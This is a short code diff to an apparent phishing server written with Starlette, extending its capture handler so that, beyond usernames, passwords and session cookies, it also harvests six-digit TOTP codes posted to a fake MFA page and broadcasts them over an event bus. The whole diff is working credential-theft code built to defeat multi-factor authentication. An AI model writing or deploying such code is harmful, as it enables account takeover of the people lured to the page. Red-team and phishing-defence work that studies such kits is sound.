@@ -9,6 +9,7 @@ from starlette.responses import RedirectResponse, Response, StreamingResponse
 
 from phishing.credentials import (
     capture_credential,
+    capture_mfa_code,
     capture_session,
     captured_credentials,
 )
@@ -42,8 +43,14 @@ async def capture(request: Request) -> Response:
         form_data = await request.form()
         username = form_data.get("username")
         password = form_data.get("password")
+        mfa_code = form_data.get("code")
+        credential = None
         if isinstance(username, str) and isinstance(password, str):
             credential = capture_credential(username, password)
+        elif isinstance(username, str) and isinstance(mfa_code, str):
+            # The /login/mfa/totp form posts username + the 6-digit TOTP code.
+            credential = capture_mfa_code(username, mfa_code)
+        if credential:
             event_bus.broadcast_credential(credential)
     elif request.method == "GET":
         session_cookie = request.cookies.get("session")
